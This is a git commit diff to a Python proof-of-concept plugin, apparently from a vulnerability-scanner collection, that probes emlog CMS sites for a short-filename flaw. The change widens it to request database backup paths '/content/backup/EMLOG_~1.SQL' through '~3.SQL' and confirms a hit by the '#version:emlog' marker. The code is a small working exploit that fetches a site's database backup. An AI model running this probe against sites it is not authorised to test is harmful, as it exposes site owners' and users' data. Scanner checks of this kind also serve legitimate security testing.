aaf790c19915d8ffc72a1ebfc6fe55019961506d
boy-hack <34109680@qq.com>
2018-11-18 23:33:25 +0800

    update emlog_database_downloader

--- cms/emlog/emlog_database_download.py
+++ cms/emlog/emlog_database_download.py
@@ -8,19 +8,20 @@ import HackRequests
 
 
 def poc(arg, **kwargs):
-    payload = '/content/backup/EMLOG_~1.SQL'
-    target = arg + payload
     hack = HackRequests.hackRequests()
-    hh = hack.http(target)
-    if hh.status_code == 200 and '#version:emlog' in hh.text():
-        result = {
-            "name": "emlog 数据库下载",  # 插件名称
-            "content": "存在短文件漏洞，可能导致数据库被下载",  # 插件返回内容详情，会造成什么后果。
-            "url": target,  # 漏洞存在url
-            "log": hh.log,
-            "tag": "info_leak"  # 漏洞标签
-        }
-        return result
+    for i in range(1,4):
+        payload = '/content/backup/EMLOG_~{}.SQL'.format(i)
+        target = arg + payload
+        hh = hack.http(target)
+        if hh.status_code == 200 and '#version:emlog' in hh.text():
+            result = {
+                "name": "emlog 数据库下载",  # 插件名称
+                "content": "存在短文件漏洞，可能导致数据库被下载",  # 插件返回内容详情，会造成什么后果。
+                "url": target,  # 漏洞存在url
+                "log": hh.log,
+                "tag": "info_leak"  # 漏洞标签
+            }
+            return result
 
 
 if __name__ == "__main__":
